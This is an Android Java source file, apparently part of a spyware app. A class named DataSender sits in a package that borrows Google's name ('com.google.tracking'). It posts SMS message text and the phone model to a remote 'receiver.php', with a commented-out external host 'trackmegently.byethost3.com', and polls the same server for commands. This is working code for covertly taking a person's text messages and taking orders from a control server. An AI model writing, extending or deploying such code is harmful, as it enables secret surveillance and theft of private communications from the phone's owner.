package com.google.tracking.sender;

import android.net.http.AndroidHttpClient;
import android.os.Build;
import android.util.Log;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.Charset;

/**
 * Created by maxim.yanukovich on 06.01.2015.
 */
public class DataSender implements IDataSender{
    private static final String TAG = "DataSender";
    private static String urlString = "http://192.168.9.102:80/SVN/receiver.php";
//    private static String urlString = "http://trackmegently.byethost3.com/receiver.php";
    private static String SMS = "sms";
    private static String COMMAND = "command";

    public DataSender() {
        Log.d(TAG, urlString.toString());

        disableConnectionReuseIfNecessary();
    }

    public void getNextAction() {
        postHttp(COMMAND, "message");
    }

    public void sendSMS(String msg) {
        postHttp(SMS, msg);
    }

    private void postHttp(String action, String msg) {
        try {

            String urlParameters = "action=" + action + "&msg=" + msg + "&model=" + Build.MODEL;
            byte[] postData = urlParameters.getBytes(Charset.forName("UTF-8"));
            int postDataLength = postData.length;

            URL url = new URL(urlString);
            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
            httpConn.setDoOutput(true);
            httpConn.setDoInput(true);
            httpConn.setInstanceFollowRedirects(false);
            httpConn.setRequestMethod("POST");
            httpConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpConn.setRequestProperty("charset", "utf-8");
            httpConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
            httpConn.setUseCaches(false);
            httpConn.connect();
            try {
                DataOutputStream os = new DataOutputStream(httpConn.getOutputStream());
                os.write(postData);

                Log.d(TAG, " getResponseCode:" + String.valueOf(httpConn.getResponseCode()));

//                DataInputStream is = new DataInputStream(httpConn.getInputStream());


//                Log.d(TAG, "input : " + is.readUTF());

            } catch (Exception ex) {
                Log.d(TAG, "Exception : " + ex.getMessage());
            }


            // Handles possible exceptions
        } catch (MalformedURLException localMalformedURLException) {
            localMalformedURLException.printStackTrace();

        } catch (IOException localIOException) {
            localIOException.printStackTrace();
        }
    }

    private void disableConnectionReuseIfNecessary() {
        // HTTP connection reuse which was buggy pre-froyo
        if (Integer.parseInt(Build.VERSION.SDK) < Build.VERSION_CODES.FROYO) {
            System.setProperty("http.keepAlive", "false");
        }
    }
}
